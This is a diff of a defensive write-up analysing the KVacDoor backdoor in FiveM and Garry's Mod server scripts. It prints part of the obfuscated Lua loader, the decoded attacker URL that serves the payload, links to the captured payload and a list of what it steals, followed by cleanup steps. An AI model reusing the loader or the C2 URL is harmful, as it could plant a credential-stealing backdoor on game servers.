@@ -1,4 +1,5 @@
-As an introduction, KVacDoor is a really used fivem and garry's mod server manager, boasting features such as 
+## 1. Introduction
+KVacDoor is a really used fivem and garry's mod server manager, boasting features such as 
 
 > **Lua Script**
 The scripting system allows you or the KVacDoor staff to quickly run lua code on your servers.
@@ -39,6 +40,7 @@ Enchanced_Tabs[10](str_utf8(), function (e, d)
     s()
 end)
 ```
+2. Code analysis and finding the full payload
 If that looks familiar, that's because it's the same code (with the link changed of course) used by the cipher panel backdoor - 
 I'd recommend reading it before continuing one, though I will explain briefly how the code works
 In-short the `random_char` table is a link, which gets interpreted by `str_utf8()` which runs as an http request on the server, giving access to it.
@@ -59,18 +61,20 @@ and translate it to text: <br> `https://fivem.kvac.cz/_/api.php?key=3Rj4lZeyvWJn
 
 cURL-ing this link grants us the payload code:
 
-minimized-payload.lua
+[fivem-payload.lua](https://github.com/Martinator9001/kvac-backdoor/blob/main/fivem-payload.lua)
 
 beautifying it a bit we get this
 
-payload.lua
+[fivem-beautified payload.lua](https://github.com/Martinator9001/kvac-backdoor/blob/main/fivem-beautified-payload.lua)
 
+
+##3. Payload explanation
 The scripts seem to grab all relevant info like licenses, IPs, identifiers from the players in your server, and also stealing API keys from the server .cfg
 It also overrides the `chatMessage` event
-It grants the resource the payload was ran from permissions in the server.cfg - and therefore txAdmin
+It grants the resource the infected script was ran from permissions in the server.cfg - and therefore txAdmin
 
 
-```Post-Infection Measures```
+##4. Post-infection measures
 It is highly recommended to shutdown the server as soon as the backdoor is installed, as by default it doesn't inject itself outside the OS and only in the former 3 locations.
 Then reseting any API keys you have put in your server.cfg (like steam, rcon passwords)
 Then reinstalling your chat script, deleting the malicious code from your resource and remove the command access granted in the last lines of the server.cfg.
